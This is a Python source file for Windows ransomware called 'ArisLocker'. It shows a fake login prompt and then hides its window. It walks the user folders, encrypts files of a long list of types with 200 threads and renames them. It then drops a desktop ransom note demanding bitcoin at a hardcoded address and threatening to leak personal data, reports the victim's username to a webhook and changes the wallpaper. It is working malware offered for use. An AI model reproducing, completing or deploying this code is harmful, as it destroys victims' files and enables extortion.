import os
import win32gui, win32con
import base64
import queue
import threading
import requests
import ctypes
import struct

from plugins.locker import Locker
from plugins.worker import Worker

#CONFIG
_BACKGROUND_URL = "https://i.ibb.co/g9tTj8H/aris.jpg"
_PATH = "C:\\Users\\" #C:\\Users\\
_BITCOIN_ADDR = "bc1qef3d3ryemlunehdxtx8xvrkdt3w6cgzj8skl2c" # i will happily accept donos ;)
_EMAIL = ""
_WEBHOOK = ""

_EXTENSTION = ".aris"
_RANSOM_NOTE = f"""
+--------------------------------+
| ╔═╗┬─┐┬┌─┐  ╦  ┌─┐┌─┐┬┌─┌─┐┬─┐ |
| ╠═╣├┬┘│└─┐  ║  │ ││  ├┴┐├┤ ├┬┘ |
| ╩ ╩┴└─┴└─┘  ╩═╝└─┘└─┘┴ ┴└─┘┴└─ |
+--------------------------------+
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Hello, 
\tCongrats you have been hit by the ArisLocker so lets talk about recovering your files. First off don't even waste your time with free decrypters.
Aris Locker uses 256 aes bit encryption which means its impossible to bruteforce or attempt to recover your files. So here are the steps to recovering
your files. First off let me prefix this by saying reporting this malware or leaving a bad review on the product will instantly disqualify you from recovering
your files, so if you wish to see your files in any shape or form I reccomend you keep quiet and follow these steps:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. Download BitPay: https://bitpay.com/ This can also be downloaded from the microsoft store.
2. Purchase $75 in bitcoin using the buy crypto option
3. Send that $75 in bitcoin to this addr: {_BITCOIN_ADDR}
4. After you have sent the money send an email to {_EMAIL} saying that you have paid and please include your user id.
5. Wait roughly 4 hours, I will send you your decrypter and key which can be used to decrypt all files encrypted by the ransomware.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
YOU HAVE ONE WEEK, AFTER ONE WEEK DECRYPTING YOUR FILES WILL BECOME $500
REPORTING THIS FILE TO ANYONE WILL RESULT IN A FULL LOSS OF FILES
FAILING TO PAY WILL RESULT IN YOUR PERSONAL DETAILS SUCH AS:
\t- IP
\t- Address
\t- Username
\t- Emails and passwords
\t- Discord Account
"""
_BANNER = "Login For More!\n"
#fake login screen LOL 
_DATA = {
  "embeds": [{
    "title": "**Aris**",
    "description": f"A new user has run Aris, here is a small amount of information about that user.\nUsername:`{os.getlogin()}`\n",
    "color": 1,
    "footer": {
      "icon_url": "https://www.shareicon.net/data/512x512/2016/07/10/793888_business_512x512.png",
      "text": "Aris | v1.0"
    },
    "thumbnail": {
      "url": "https://upload.wikimedia.org/wikipedia/commons/9/9a/BTC_Logo.svg"
    }
  }
 ]
}
_FILE_TYPES = ['.txt','.exe','.php','.pl','.7z','.rar','.m4a','.wma','.avi','.wmv','.csv','.d3dbsp','.sc2save','.sie','.sum','.ibank','.t13','.t12','.qdf','.gdb','.tax','.pkpass','.bc6','.bc7','.bkp','.qic','.bkf','.sidn','.sidd','.mddata','.itl','.itdb','.icxs','.hvpl','.hplg','.hkdb','.mdbackup','.syncdb','.gho','.cas','.svg','.map','.wmo','.itm','.sb','.fos','.mcgame','.vdf','.ztmp','.sis','.sid','.ncf','.menu','.layout','.dmp','.blob','.esm','.001','.vtf','.dazip','.fpk','.mlx','.kf','.iwd','.vpk','.tor','.psk','.rim','.w3x','.fsh','.ntl','.arch00','.lvl','.snx','.cfr','.ff','.vpp_pc','.lrf','.m2','.mcmeta','.vfs0','.mpqge','.kdb','.db0','.mp3','.upx','.rofl','.hkx','.bar','.upk','.das','.iwi','.litemod','.asset','.forge','.ltx','.bsa','.apk','.re4','.sav','.lbf','.slm','.bik','.epk','.rgss3a','.pak','.big','.unity3d','.wotreplay','.xxx','.desc','.py','.m3u','.flv','.js','.css','.rb','.png','.jpeg','.p7c','.p7b','.p12','.pfx','.pem','.crt','.cer','.der','.x3f','.srw','.pef','.ptx','.r3d','.rw2','.rwl','.raw','.raf','.orf','.nrw','.mrwref','.mef','.erf','.kdc','.dcr','.cr2','.crw','.bay','.sr2','.srf','.arw','.3fr','.dng','.jpeg','.jpg','.cdr','.indd','.ai','.eps','.pdf','.pdd','.psd','.dbfv','.mdf','.wb2','.rtf','.wpd','.dxg','.xf','.dwg','.pst','.accdb','.mdb','.pptm','.pptx','.ppt','.xlk','.xlsb','.xlsm','.xlsx','.xls','.wps','.docm','.docx','.doc','.odb','.odc','.odm','.odp','.ods','.odt','.sql','.zip','.tar','.tar.gz','.tgz','.biz','.ocx','.html','.htm','.3gp','.srt','.cpp','.mid','.mkv','.mov','.asf','.mpeg','.vob','.mpg','.fla','.swf','.wav','.qcow2','.vdi','.vmdk','.vmx','.gpg','.aes','.ARC','.PAQ','.tar.bz2','.tbk','.bak','.djv','.djvu','.bmp','.cgm','.tif','.tiff','.NEF','.cmd','.class','.jar','.java','.asp','.brd','.sch','.dch','.dip','.vbs','.asm','.pas','.ldf','.ibd','.MYI','.MYD','.frm','.dbf','.SQLITEDB','.SQLITE3','.asc','.lay6','.lay','.ms11(Securitycopy)','.sldm','.sldx','.ppsm','.ppsx','.ppam','.docb','.mml','.sxm','.otg','.slk','.xlw','.xlt','.xlm','.xlc','.dif','.stc','.sxc','.ots','.ods','.hwp','.dotm','.dotx','.docm','.DOT','.max','.xml','.uot','.stw','.sxw','.ott','.csr','.key','wallet.dat']

L = Locker()
#code
class ArisLocker():
    def __init__(self):
        self.files = []

    def login_screen(self):
        print(_BANNER)      
        passw = input("~ \u001b[91;1mPlease Enter Your Password: \033[00m")
        the_program_to_hide = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)

    def encrypt_file(self, filepath):
        """
        """
        try:
            with open(filepath, "rb") as file:
                content = L.encrypt_content(file.read())
                with open(filepath, "wb") as newF:
                    newF.write(content)
                    newF.flush()
                    newF.close()
            os.rename(filepath, filepath + _EXTENSTION)
        except Exception as e:
            print(e)
            pass

    def file_walker(self):
        for subdir, dirs, files in os.walk(_PATH):
            for file in files:
                filepath = subdir + os.sep + file
                for ft in _FILE_TYPES:
                    if ft in filepath:
                        self.files.append(filepath)


    def alert(self):
        """
        """
        readme = os.environ["HOMEPATH"] + "\\Desktop\\readme.txt"
        with open(readme, "w",encoding="utf-8") as important:
            important.write(_RANSOM_NOTE)
            important.flush()
            important.close()
        ctypes.windll.user32.MessageBoxW(0, f"I would check the readme.txt on your desktop if I where you ;)", "Important", 0x0 | 0x10)
        self.report()
        with open("background.jpg","wb") as background:
            content = requests.get(_BACKGROUND_URL).content
            background.write(content)
            background.flush()
            background.close()
        image = os.path.abspath("background.jpg")

        if struct.calcsize('P') * 8 == 64:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image , 3)
        else:
            ctypes.windll.user32.SystemParametersInfoA(20, 0, image , 3)


    def report(self):
        """
        """
        requests.post(_WEBHOOK, json=_DATA)

if __name__ == "__main__":
    os.system("cls")
    AL = ArisLocker()
    AL.login_screen()
    AL.file_walker()
    q = queue.Queue()
    for file in set(AL.files):
        q.put(file)
    for _ in range(200):
        Worker(q, AL.encrypt_file).start()
    q.join()
    AL.alert()